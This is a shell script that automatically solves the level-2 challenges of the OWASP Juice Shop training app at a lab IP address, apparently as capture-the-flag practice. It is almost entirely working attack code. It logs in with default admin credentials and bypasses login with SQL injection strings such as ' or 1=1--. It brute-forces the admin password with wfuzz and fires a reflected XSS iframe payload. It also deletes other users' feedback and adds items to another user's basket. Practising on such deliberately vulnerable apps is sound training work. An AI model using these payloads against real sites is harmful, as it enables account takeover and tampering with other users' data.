#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
target_ip="10.10.243.253"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

# Initiate session and cookies
echo "2.0 - INITIATING SESSION"
curl -s -X GET "http://$target_ip" -L -o /dev/null
curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "$result_folder/2-cookies.txt" -L -o /dev/null
IO=$(grep io "$result_folder/2-cookies.txt" | awk '{print $7}')
echo "--> Session initiated with cookie IO ${IO}"
sed -i 's/#HttpOnly_//g' "$result_folder/2-cookies.txt"
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/2-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/2-cookies.txt

# Access admin section
echo "2.1 - ADMIN SECTION"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/2-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/2-admin.json
ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/2-admin.json)
echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
cp $result_folder/2-cookies.txt $result_folder/2-admin-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/2-admin-cookies.txt
curl -s -X GET http://$target_ip/#/administration -b "$result_folder/2-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/2-admin.html
curl -s -X GET http://$target_ip/rest/user/authentication-details -b "$result_folder/2-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/2-details.json
# Being able to retrieve the 19px image is what changes the challenge status to solved....
curl -s -X GET http://$target_ip/assets/public/images/padding/19px.png -b "$result_folder/2-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o /dev/null
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/administration" $result_folder/2-admin-cookies.txt > $result_folder/2-admin.html 2>/dev/null

# Remove all 5 stars feedbacks
echo "2.3 - FIVE-STAR FEEDBACK"
curl -s -X GET http://$target_ip/api/Feedbacks -b "$result_folder/2-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/2-feedbacks.json
ID=$(jq '.data[] | select(.rating == 5) | .id' $result_folder/2-feedbacks.json)
if ! [ -z "$ID" ]; then
    echo "--> Found feedback ${ID}"
    curl -s -X DELETE http://$target_ip/api/Feedbacks/${ID} -b "$result_folder/2-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o /dev/null
fi

# Log in with the administrator's user account.
echo "2.4 - LOGIN ADMIN"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/2-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' or 1=1--'\",\"password\":\"a\"}" -o /dev/null

# Log in with the administrator's user credentials without previously changing them or applying SQL Injection.
echo "2.6 - PASSWORD STRENGTH"
#wfuzz -c -z file,/usr/share/seclists/Passwords/Common-Credentials/best1050.txt -d '{"email": "admin@juice-sh.op", "password": "FUZZ"}' -H "Content-Type: application/json" -f $result_folder/2-wfuzz.txt --sc 200 --hc 401 http://$target_ip/rest/user/login
ADMIN_PASSWORD=$(cat $result_folder/2-wfuzz.txt | grep "C=200" | sed -n 's/.*"\(.*\)"/\1/p')
echo "--> Admin password is ${ADMIN_PASSWORD}"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/2-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$ADMIN_PASSWORD\"}" -o /dev/null

# Perform a reflected XSS attack with <iframe src="javascript:alert(`xss`)">
echo "2.7 - REFLECTED XSS"
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E" "$result_folder/3-cookies.txt" > $result_folder/3-track.html 2> /dev/null

# Access another user basket
echo "2.9 - ACCESS ANOTHER USER BASKET"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/2-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/2-jim.json
JIM_TOKEN=$(jq -r '.authentication.token' $result_folder/2-jim.json)
BASKET_ID=$(jq -r '.authentication.bid' $result_folder/2-jim.json)
cp $result_folder/2-cookies.txt $result_folder/2-jim-cookies.txt
echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$JIM_TOKEN" >> $result_folder/2-jim-cookies.txt
curl -s -X POST "http://$target_ip/api/BasketItems/" -b "$result_folder/2-jim-cookies.txt" -L -H "Authorization: Bearer ${JIM_TOKEN}" -H "Content-Type: application/json" -d "{\"ProductId\":30,\"BasketId\":\"$BASKET_ID\",\"quantity\":1}" -o $result_folder/2-product.json
curl -s -X GET http://$target_ip/rest/basket/1 -b "$result_folder/2-jim-cookies.txt" -H "Authorization: Bearer ${JIM_TOKEN}" -L -o $result_folder/2-basket.json
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/basket" $result_folder/2-jim-cookies.txt > $result_folder/2-basket.html 2> /dev/null

# Compute score
echo "2.X - COMPUTE SCORE"
curl -s -X GET http://$target_ip/api/Challenges/?sort=name -b "$result_folder/2-cookies.txt" -L -o $result_folder/2-scores.json
SOLVED=$(jq '[.data[] | select(.difficulty == 2 and .solved == true)] | length' $result_folder/2-scores.json)
TOTAL=$(jq '[.data[] | select(.difficulty == 2 and .solved != null)] | length' $result_folder/2-scores.json)
echo "\n************* SOLVED : $SOLVED / $TOTAL *************\n"
